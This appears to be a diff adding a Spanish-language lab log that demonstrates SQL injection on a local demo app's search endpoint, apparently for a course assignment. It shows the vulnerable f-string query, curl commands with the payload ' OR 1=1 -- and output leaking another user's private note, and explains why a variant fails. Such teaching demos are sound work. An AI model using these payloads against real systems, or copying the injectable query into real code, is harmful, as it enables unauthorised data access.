@@ -1,0 +1,24 @@
+DEMO V1 - SQL Injection (CWE-89) en /buscar  | 2026-10-01 03:25
+App local: python -m app.app  (http://127.0.0.1:5000)
+Escenario: 'beto' tiene una nota privada; 'ana' inicia sesión e intenta leerla.
+Consulta vulnerable en app/app.py:
+  f"SELECT id, titulo, contenido FROM notas WHERE usuario_id = {session['usuario_id']} AND titulo LIKE '%{q}%'"
+
+=== 1) Búsqueda normal de ana: q=Lista ===
+curl -b cookies_ana "http://127.0.0.1:5000/buscar?q=Lista"
+1 resultado(s)
+ | Lista de Ana | comprar pan | 
+
+=== 2) Ataque: q=' OR 1=1 -- ===
+curl -b cookies_ana -G --data-urlencode "q=' OR 1=1 --" http://127.0.0.1:5000/buscar
+SQL resultante: ... WHERE usuario_id = 2 AND titulo LIKE '%' OR 1=1 --%'
+2 resultado(s)
+ | Privado de Beto | PIN del banco: 4321 (dato falso de demo) | 
+ | Lista de Ana | comprar pan | 
+
+=== 3) Variante pedida en el enunciado: q=' OR '1'='1 ===
+1 resultado(s)
+ | Lista de Ana | comprar pan | 
+(No devuelve todo porque la consulta termina en  OR '1'='1%' , que es falso; por eso se usa el comentario --)
+
+Resultado: con ' OR 1=1 -- ana ve la nota PRIVADA de beto -> fuga de información.
